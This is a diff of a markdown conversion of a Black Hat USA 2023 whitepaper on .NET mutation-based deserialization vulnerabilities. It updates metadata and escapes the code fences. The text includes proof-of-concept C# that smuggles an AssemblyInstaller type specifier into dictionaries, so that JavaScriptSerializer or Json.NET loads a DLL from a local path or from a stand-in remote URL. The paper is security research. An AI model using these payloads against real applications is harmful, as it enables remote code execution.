@@ -8,19 +8,24 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/Jonathan Birch_Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET_wp.pdf"
 pages: 5
 sha256: "f1eb3f8516fbc164686d171601a827ec7dc514171ab5b8ef0a6f8d03e6b0c46c"
-text_chars: 11556
+text_chars: 11576
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-11T23:57:54Z"
+converted_at: "2026-08-12T04:11:12Z"
 ---
 # Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET
 
 **Speakers:** Jonathan Birch  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Jonathan Birch_Second Breakfast Implicit and Mutation-Based Serialization Vulnerabilities in dotNET_wp.pdf` (5 pages)
+
 
 ## Slide 1
 
@@ -64,20 +69,20 @@ when their constructor is called, when their properties are set, or in some case
 
 Various .NET serializers that serialize to a JSON or BSON format allow for polymorphism in certain configurations by including a “type specifier” in the serialized data. For example, .NET’s JavaScriptSerializer, when used in conjunction with a SimpleTypeResolver, serializes an Exception object to a string like the following:
 
-```
+\```
 {"__type":"System.Exception, mscorlib, Version=4.0.0.0, Culture=neutral,
 PublicKeyToken=b77a5c561934e089","Message":"Out of
 memory","Data":{},"InnerException":null,"TargetSite":null,"StackTrace":null,"
 HelpLink":null,"Source":null,"HResult":-2146233088}
-```
+\```
 
 In this JSON string the “__type” property is the “type specifier”.
 
 Most JSON and BSON serializers also have the property that they store objects with a key-value structure by using the key names directly as the keys in the resulting JSON. For example, a .NET _Dictionary<string, string>_ object might be serialized as:
 
-```
+\```
 {“key1”:”value1”,”key2”:”value2”}
-```
+\```
 
 This pattern is also used for various other key-value collection objects, such as HashTable, JObject, or ExpandoObject.
 
@@ -91,7 +96,7 @@ This may be more easily understood through specific examples.
 
 This code is a minimal proof-of-concept mutation attack against the .NET JavaScriptSerializer:
 
-```
+\```
 Dictionary<string, string> stringDict = new Dictionary<string, string>();
 stringDict.Add("Apple", "Pear");//having other entries makes no difference
 stringDict.Add("__type",
@@ -99,25 +104,25 @@ stringDict.Add("__type",
 Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
 stringDict.Add("Whatever", "Whatever");//having other entries makes no difference
 stringDict.Add("Path", "c:\\temp\\Malicious.dll");
-```
+\```
 
 2
 
 ## Slide 3
 
-```
+\```
 JavaScriptSerializer serializer = new JavaScriptSerializer(new SimpleTypeResolver());
-```
+\```
 
-```
+\```
 string json = serializer.Serialize(stringDict);
-```
+\```
 
-```
+\```
 //this next line runs code by loading an untrusted DLL from a path in the payload
 Dictionary<string,string> myDeserializedObject =
 serializer.Deserialize<Dictionary<string,string>>(json);
-```
+\```
 
 In this example, JavaScriptSerializer serializes the Dictionary object into the following JSON string:
 
@@ -133,27 +138,27 @@ Note that other keys and values being present in the dictionary does not matter 
 
 This code is a similar proof-of-concept mutation attack against the Newtonsoft Json.NET serializer:
 
-```
+\```
 Dictionary<string, string> basicStringDict = new Dictionary<string, string>();
 basicStringDict.Add("$type", "System.Configuration.Install.AssemblyInstaller,
 System.Configuration.Install, Version = 4.0.0.0, Culture = neutral, PublicKeyToken =
 b03f5f7f11d50a3a");
-```
+\```
 
-```
+\```
 basicStringDict.Add("Path", "https://www.example.com/fake.dll");
 JsonSerializerSettings settings = new JsonSerializerSettings() { TypeNameHandling =
 TypeNameHandling.Auto };
-```
+\```
 
-```
+\```
 string serializedDictionary = JsonConvert.SerializeObject(basicStringDict, settings);
 System.Console.WriteLine(serializedDictionary);
-```
+\```
 
-```
+\```
 Object deserialized = JsonConvert.DeserializeObject(serializedDictionary, settings);
-```
+\```
 
 In this case the type specifier must be the first key in the dictionary. Json.NET also checks assignability, so this exploit only works because the unsafe deserialization does not specify an expected type.
 
